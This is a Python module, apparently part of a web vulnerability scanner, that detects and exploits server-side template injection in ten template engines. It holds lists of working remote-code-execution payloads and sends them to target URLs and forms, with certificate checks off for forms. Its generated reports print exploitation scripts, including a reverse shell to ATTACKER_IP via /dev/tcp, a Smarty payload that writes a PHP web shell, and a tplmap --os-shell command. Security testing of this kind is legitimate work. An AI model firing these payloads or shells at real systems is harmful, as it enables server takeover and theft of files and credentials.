"""
Server-Side Template Injection (SSTI) Detection and Exploitation
Tests for template injection in popular template engines
"""

import requests
from urllib.parse import urljoin, quote
import re
from bs4 import BeautifulSoup

# SSTI payloads for different template engines
SSTI_PAYLOADS = {
    'jinja2': [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{config}}",
        "{{config.items()}}",
        "{{request}}",
        "{{self}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('whoami').read()}}{% endif %}{% endfor %}",
        "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    ],
    'flask': [
        "{{config.SECRET_KEY}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{url_for.__globals__['__builtins__'].__import__('os').popen('whoami').read()}}",
        "{{g.pop.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ],
    'tornado': [
        "{{handler.settings}}",
        "{{handler.application.settings}}",
        "{% import os %}{{os.popen('whoami').read()}}",
        "{% import subprocess %}{{subprocess.check_output('id',shell=True)}}",
    ],
    'mako': [
        "${7*7}",
        "${self}",
        "${__import__('os').popen('whoami').read()}",
        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
    ],
    'freemarker': [
        "${7*7}",
        "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
        "<#assign ex='freemarker.template.utility.ObjectConstructor'?new()>${ex('java.lang.ProcessBuilder','whoami').start()}",
    ],
    'velocity': [
        "#set($str=$class.inspect('java.lang.String').type)",
        "#set($chr=$class.inspect('java.lang.Character').type)",
        "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('whoami'))",
        "$ex.waitFor()",
    ],
    'thymeleaf': [
        "${7*7}",
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()}__",
        "__${{T(java.lang.Runtime).getRuntime().exec('id')}}__",
    ],
    'erb': [
        "<%= 7*7 %>",
        "<%= system('whoami') %>",
        "<%= `whoami` %>",
        "<%= File.open('/etc/passwd').read %>",
    ],
    'smarty': [
        "{php}echo 7*7;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[cmd]); ?>',self::clearConfig())}",
        "{system('whoami')}",
    ],
    'twig': [
        "{{7*7}}",
        "{{7*'7'}}",
        "{{_self}}",
        "{{_self.env}}",
        "{{_self.env.getFilter('system')}}",
        "{{['id']|filter('system')}}",
        "{{['id','|',' ','sleep',' ','5']|filter('system')}}",
    ],
}

# Indicators that template executed
EXECUTION_INDICATORS = {
    'jinja2': ['49', 'dict_items', 'Request'],
    'flask': ['SECRET', 'uid=', 'root'],
    'tornado': ['static_path', 'template_path'],
    'mako': ['49', 'uid=', 'gid='],
    'freemarker': ['49', 'uid=', 'Process'],
    'velocity': ['class', 'inspect'],
    'thymeleaf': ['49', 'uid='],
    'erb': ['49', 'uid=', 'root'],
    'smarty': ['49', 'uid='],
    'twig': ['49', '7777777'],
}

def test_ssti(scanner):
    """Test for Server-Side Template Injection vulnerabilities"""
    findings = []
    
    # Get cached response to find forms
    response = scanner.get_cached_response(scanner.target_url)
    if not response:
        return findings
    
    url = response.url
    
    # Test URL parameters
    if '?' in url:
        findings.extend(_test_url_ssti(scanner, url))
    
    # Test forms using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')
    forms = soup.find_all('form')
    for form_idx, form in enumerate(forms):
        findings.extend(_test_form_ssti(scanner, form, form_idx))
    
    return findings

def _test_url_ssti(scanner, url):
    """Test URL parameters for SSTI"""
    findings = []
    base_url = url.split('?')[0]
    params_str = url.split('?')[1] if '?' in url else ''
    
    if not params_str:
        return findings
    
    # Parse parameters
    params = {}
    for param in params_str.split('&'):
        if '=' in param:
            key, value = param.split('=', 1)
            params[key] = value
    
    # Test each parameter with SSTI payloads
    for param_name in params.keys():
        for engine, payloads in SSTI_PAYLOADS.items():
            for payload in payloads[:3]:  # Test top 3 payloads per engine
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    test_url = base_url + '?' + '&'.join([f"{k}={quote(v)}" for k, v in test_params.items()])
                    test_response = requests.get(test_url, timeout=10)
                    
                    # Check for execution indicators
                    for indicator in EXECUTION_INDICATORS[engine]:
                        if indicator in test_response.text:
                            scanner.add_finding(
                                severity='CRITICAL',
                                category='Template Injection',
                                title=f'🔥 SSTI in {engine.upper()} - RCE POSSIBLE!',
                                description=f'''**SERVER-SIDE TEMPLATE INJECTION DETECTED**\n\n'''
                                          f'''Template Engine: {engine}\n'''
                                          f'''Parameter: {param_name}\n'''
                                          f'''Payload: `{payload}`\n'''
                                          f'''Indicator found: {indicator}\n\n'''
                                          f'''**REMOTE CODE EXECUTION:**\n'''
                                          f'''```bash\n'''
                                          f'''# Test payload:\n'''
                                          f'''{payload}\n\n'''
                                          f'''# Command execution payload:\n'''
                                          f'''{_get_rce_payload(engine, "cat /etc/passwd")}\n'''
                                          f'''```\n\n'''
                                          f'''**EXPLOITATION:**\n'''
                                          f'''```python\n'''
                                          f'''import requests\n\n'''
                                          f'''# Read /etc/passwd:\n'''
                                          f'''payload = "{_get_rce_payload(engine, 'cat /etc/passwd')}"\n'''
                                          f'''params = {{{repr(param_name)}: payload}}\n'''
                                          f'''r = requests.get("{base_url}", params=params)\n'''
                                          f'''print(r.text)  # Will contain /etc/passwd\n\n'''
                                          f'''# Reverse shell:\n'''
                                          f'''payload = "{_get_rce_payload(engine, 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')}"\n'''
                                          f'''params = {{{repr(param_name)}: payload}}\n'''
                                          f'''requests.get("{base_url}", params=params)\n'''
                                          f'''# Now you have a shell!\n'''
                                          f'''```\n\n'''
                                          f'''**AUTOMATED EXPLOITATION:**\n'''
                                          f'''```bash\n'''
                                          f'''# Using tplmap:\n'''
                                          f'''tplmap -u "{test_url}" --os-shell\n\n'''
                                          f'''# Manual exploitation:\n'''
                                          f'''curl "{test_url.replace(payload, _get_rce_payload(engine, 'whoami'))}"\n'''
                                          f'''```''',
                                url=test_url,
                                remediation='''**CRITICAL FIX:**\n\n'''
                                          '''1. Never render user input directly in templates\n'''
                                          '''2. Use sandboxed template environments\n'''
                                          '''3. Disable dangerous functions (exec, eval, system)\n'''
                                          '''4. Validate and sanitize ALL user input\n'''
                                          '''5. Use template auto-escaping\n'''
                                          '''6. Consider using a safe template language'''
                            )
                            findings.append(True)
                            break
                    
                except Exception:
                    pass
    
    return findings

def _test_form_ssti(scanner, form, form_idx):
    """Test form inputs for SSTI"""
    findings = []
    
    try:
        action = form.get('action') or scanner.target_url
        method = str(form.get('method', 'get')).upper()
        action_url = urljoin(scanner.target_url, action)
        
        inputs = form.find_all('input') + form.find_all('textarea')
        
        if not inputs:
            return findings
        
        # Test each input field
        for input_elem in inputs:
            input_type = str(input_elem.get('type', 'text')).lower()
            input_name = input_elem.get('name')
            
            if input_type in ['submit', 'button', 'image', 'file']:
                continue
            
            if not input_name:
                continue
            
            # Test with different template engines
            for engine, payloads in SSTI_PAYLOADS.items():
                payload = payloads[0]  # Use first payload for form testing
                
                try:
                    # Build form data
                    form_data = {}
                    for inp in inputs:
                        name = inp.get('name')
                        if name:
                            if name == input_name:
                                form_data[name] = payload
                            else:
                                form_data[name] = inp.get('value') or 'test'
                    
                    # Submit form
                    if method == 'POST':
                        test_response = requests.post(action_url, data=form_data, timeout=10, verify=False)
                    else:
                        test_response = requests.get(action_url, params=form_data, timeout=10, verify=False)
                    
                    # Check for execution
                    for indicator in EXECUTION_INDICATORS[engine]:
                        if indicator in test_response.text:
                            scanner.add_finding(
                                severity='CRITICAL',
                                category='Template Injection',
                                title=f'🔥 SSTI via Form ({engine}) - RCE POSSIBLE!',
                                description=f'''**FORM-BASED TEMPLATE INJECTION**\n\n'''
                                          f'''Template Engine: {engine}\n'''
                                          f'''Form: #{form_idx}\n'''
                                          f'''Field: {input_name}\n'''
                                          f'''Method: {method}\n'''
                                          f'''Test payload: `{payload}`\n\n'''
                                          f'''**PROOF OF CONCEPT:**\n'''
                                          f'''```python\n'''
                                          f'''import requests\n\n'''
                                          f'''# Execute command:\n'''
                                          f'''payload = "{_get_rce_payload(engine, 'id')}"\n'''
                                          f'''data = {repr(form_data).replace(repr(payload), 'payload')}\n'''
                                          f'''r = requests.{method.lower()}("{action_url}", {"data" if method == "POST" else "params"}=data)\n'''
                                          f'''print(r.text)  # Contains command output\n'''
                                          f'''```''',
                                url=action_url,
                                remediation='Never render user input in templates. Use sandboxing and auto-escaping.'
                            )
                            findings.append(True)
                            return findings  # Found SSTI, no need to test more
                    
                except Exception:
                    pass
    
    except Exception:
        pass
    
    return findings

def _get_rce_payload(engine, command):
    """Get RCE payload for specific template engine"""
    rce_payloads = {
        'jinja2': f"{{{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}}}",
        'flask': f"{{{{request.application.__globals__.__builtins__.__import__('os').popen('{command}').read()}}}}",
        'tornado': f"{{% import os %}}{{{{os.popen('{command}').read()}}}}",
        'mako': f"${{__import__('os').popen('{command}').read()}}",
        'freemarker': f"${{\"freemarker.template.utility.Execute\"?new()('{command}')}}",
        'velocity': f"#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{command}'))$ex.waitFor()",
        'thymeleaf': f"${{{{T(java.lang.Runtime).getRuntime().exec('{command}')}}}}",
        'erb': f"<%= `{command}` %>",
        'smarty': f"{{{{system('{command}')}}}}",
        'twig': f"{{{{['{command}']|filter('system')}}}}",
    }
    
    return rce_payloads.get(engine, command)

def detect_template_engine(response):
    """Try to detect which template engine is in use"""
    text = response.text.lower()
    headers = {k.lower(): v.lower() for k, v in response.headers.items()}
    
    engines = []
    
    # Check headers
    if 'x-powered-by' in headers:
        powered_by = headers['x-powered-by']
        if 'flask' in powered_by:
            engines.append('flask/jinja2')
        elif 'tornado' in powered_by:
            engines.append('tornado')
        elif 'express' in powered_by:
            engines.append('express/ejs')
    
    # Check error messages
    if 'jinja2.exceptions' in text or 'jinja2' in text:
        engines.append('jinja2')
    elif 'tornado.template' in text:
        engines.append('tornado')
    elif 'mako.exceptions' in text:
        engines.append('mako')
    elif 'freemarker' in text:
        engines.append('freemarker')
    elif 'velocity' in text:
        engines.append('velocity')
    elif 'thymeleaf' in text:
        engines.append('thymeleaf')
    elif 'erb' in text and 'ruby' in text:
        engines.append('erb')
    elif 'smarty' in text:
        engines.append('smarty')
    elif 'twig' in text:
        engines.append('twig')
    
    return engines if engines else ['unknown']
